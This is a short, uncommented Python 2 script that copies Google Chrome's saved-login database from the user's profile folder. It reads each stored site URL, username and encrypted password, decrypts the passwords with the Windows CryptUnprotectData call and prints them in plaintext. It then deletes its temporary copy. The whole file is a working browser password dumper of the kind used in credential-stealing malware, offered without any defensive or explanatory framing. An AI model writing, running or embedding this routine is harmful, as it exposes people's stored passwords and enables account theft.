import os
import sqlite3
import win32crypt
import shutil

def decrypt_chrome_passwords():
    entries = []
    src = os.path.join(os.getenv('LOCALAPPDATA'),
                       'Google',
                       'Chrome',
                       'User Data',
                       'Default',
                       'Login Data')

    dest = os.path.join(os.getenv('LOCALAPPDATA'),
                        'Google',
                        'Chrome',
                        'User Data',
                        'Default',
                        'Login Backup')

    if os.path.exists(dest):
        os.remove(dest)

    shutil.copyfile(src, dest)

    conn = sqlite3.connect(dest)

    try:
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for raw in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(raw[2])[1]

            entries.append({'url': raw[0],
                            'username': raw[1],
                            'password': password})
        return entries
    finally:
        conn.close()
        os.remove(dest)

def main():
    entries = decrypt_chrome_passwords()
    for entry in entries:
        print entry

if __name__ == '__main__':
    main()
